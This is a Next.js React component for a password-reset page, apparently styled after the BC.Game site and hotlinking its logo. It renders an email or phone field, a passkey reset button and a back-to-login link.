"use client";
import Link from "next/link";
import { useState, useEffect } from "react";
import { useAuth } from "@/contexts/AuthContext";

export default function ForgotPassword() {
  const { isLoggedIn } = useAuth();

  const [isMobile, setIsMobile] = useState<boolean | null>(null);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 1024);
    };
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  useEffect(() => {
    if (isLoggedIn) {
      window.location.href = "/";
    }
  }, [isLoggedIn]);

  if (isLoggedIn) {
    return null;
  }

  if (isMobile === null) return null;
  return (
    <>
      <div className="absolute left-0 top-0 flex h-14 w-full items-center bg-layer3 px-4 py-3">
        <span className="text-lg font-extrabold hidden md:block">
          Reset Password
        </span>
        <img
          alt="logo"
          className="h-8 md:hidden"
          src="https://bc.game/substation/bc/logo/logo_w.png"
        />
        <a
          className="button button-m ml-auto size-8! rounded-lg bg-white_alpha5 p-0"
          href="/"
        >
          <div className="icon size-4.5! fill-secondary">
            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.15445 7.40846C6.3734 8.18951 6.3734 9.45584 7.15445 10.2369L12.9175 15.9999L7.15445 21.7629C6.3734 22.544 6.3734 23.8103 7.15445 24.5914L7.40846 24.8454C8.18951 25.6264 9.45584 25.6264 10.2369 24.8454L15.9998 19.0825L21.7631 24.8458C22.5441 25.6269 23.8104 25.6269 24.5915 24.8458L24.8455 24.5918C25.6265 23.8108 25.6265 22.5444 24.8455 21.7634L19.0825 16.0003L24.8455 10.2373C25.6265 9.45627 25.6265 8.18994 24.8455 7.40889L24.5915 7.15488C23.8104 6.37383 22.5441 6.37383 21.7631 7.15488L16.0002 12.9177L10.2369 7.15445C9.45584 6.3734 8.18951 6.3734 7.40846 7.15445L7.15445 7.40846Z" />
            </svg>
          </div>
        </a>
      </div>
      <div className="px-6 pt-6 sm:px-12 sm:pt-8">
        <div className="mb-4 flex h-5! items-center text-lg font-extrabold md:hidden">
          Reset Password
        </div>
        <form>
          <div className="input mt-4 bg-input_darken">
            <input placeholder="Email / Phone Number" required />
          </div>
          <button
            className="button button-brand button-m mt-4 w-full"
            type="submit"
          >
            <span>Reset Password</span>
          </button>
        </form>

        <button
          className="button button-m mt-3 h-10 w-full border border-third"
          type="button"
        >
          <div className="icon size-5 fill-secondary">
            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M14.8879 14.7662C16.228 14.7647 17.5128 14.2316 18.4604 13.284C19.4081 12.3364 19.9412 11.0516 19.9427 9.71149V9.56056C19.9427 8.21997 19.41 6.93429 18.4621 5.98635C17.5141 5.03842 16.2286 4.50586 14.8879 4.50586C13.5473 4.50586 12.2617 5.03842 11.3137 5.98635C10.3658 6.93429 9.83322 8.21997 9.83322 9.56056V9.71149C9.83474 11.0516 10.3678 12.3364 11.3154 13.284C12.263 14.2316 13.5478 14.7647 14.8879 14.7662ZM20.4563 26.3923C20.495 26.4858 20.5415 26.5757 20.5952 26.661H5.03468C4.8972 26.661 4.76161 26.6289 4.63877 26.5671C4.51592 26.5054 4.40922 26.4157 4.32719 26.3054C4.24515 26.1951 4.19007 26.0671 4.16633 25.9317C4.14258 25.7963 4.15083 25.6572 4.19043 25.5254L4.85124 23.3282C5.50009 21.171 6.82676 19.2802 8.63458 17.9361C10.4424 16.592 12.6352 15.8662 14.8879 15.8662C15.8831 15.8662 16.8665 16.0079 17.8103 16.2819C17.8128 16.4597 17.8238 16.6379 17.8432 16.8156C17.9546 17.8314 18.3405 18.7978 18.9598 19.6106C19.3406 20.1105 19.8008 20.5408 20.3194 20.8857V25.7046C20.3194 25.9406 20.3659 26.1742 20.4563 26.3923ZM27.2784 14.1542C27.6508 14.7736 27.8473 15.4829 27.8469 16.2058C27.8466 17.131 27.5237 18.0271 26.9337 18.74C26.3437 19.4528 25.5237 19.9376 24.6149 20.1108V21.2888C24.6149 21.3219 24.6257 21.3541 24.6457 21.3803L25.8934 23.0149C25.9167 23.0458 25.9276 23.0843 25.9233 23.1226C25.9191 23.1612 25.9005 23.1965 25.871 23.2215L24.7348 24.1842C24.7192 24.1973 24.7065 24.2135 24.6975 24.2316C24.6883 24.2498 24.6829 24.2696 24.6817 24.2899C24.6805 24.3103 24.6834 24.3306 24.6901 24.3497C24.6969 24.3688 24.7076 24.3864 24.7214 24.4014L25.8821 25.6607C25.9084 25.6893 25.9227 25.7269 25.922 25.7659C25.9212 25.8048 25.9054 25.8418 25.8779 25.8694L24.2979 27.4494C24.2696 27.4777 24.2312 27.4937 24.1912 27.4937C24.1513 27.4937 24.1129 27.4777 24.0847 27.4494L22.4464 25.8112C22.4324 25.7972 22.4213 25.7806 22.4137 25.7623C22.4061 25.744 22.4022 25.7243 22.4022 25.7046V19.8998C21.7303 19.6332 21.144 19.1884 20.706 18.6134C20.268 18.0384 19.9949 17.3549 19.9162 16.6364C19.8375 15.9179 19.956 15.1915 20.2592 14.5353C20.5623 13.8791 21.0386 13.318 21.6367 12.9121C22.2348 12.5063 22.9322 12.2712 23.654 12.232C24.3758 12.1928 25.0946 12.351 25.7332 12.6897C26.3717 13.0284 26.906 13.5347 27.2784 14.1542ZM23.2068 16.0047C23.4031 16.1358 23.6337 16.2058 23.8698 16.2058C24.0264 16.2058 24.1816 16.1749 24.3263 16.1149C24.4711 16.055 24.6026 15.9671 24.7135 15.8562C24.8242 15.7455 24.9121 15.614 24.9721 15.4692C25.032 15.3244 25.0628 15.1692 25.0628 15.0126C25.0628 14.7766 24.9929 14.5459 24.8618 14.3497C24.7306 14.1534 24.5443 14.0005 24.3263 13.9102C24.1083 13.8199 23.8683 13.7963 23.6369 13.8423C23.4055 13.8884 23.1929 14.002 23.026 14.1689C22.8591 14.3357 22.7455 14.5484 22.6995 14.7798C22.6534 15.0113 22.6771 15.2512 22.7673 15.4692C22.8576 15.6873 23.0106 15.8735 23.2068 16.0047Z"
              ></path>
            </svg>
          </div>
          <span className="ml-2 font-extrabold text-primary">
            Reset by Passkey
          </span>
        </button>

        <div className="center mt-4 flex w-full">
          <Link
            href="/login/signin"
            className="flex items-center text-center font-extrabold text-secondary hover:text-primary hover:underline inactive"
          >
            <div className="icon size-4.5!">
              <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
              </svg>
            </div>
            <span className="ml-1">Back to Login</span>
          </Link>
        </div>
      </div>
    </>
  );
}

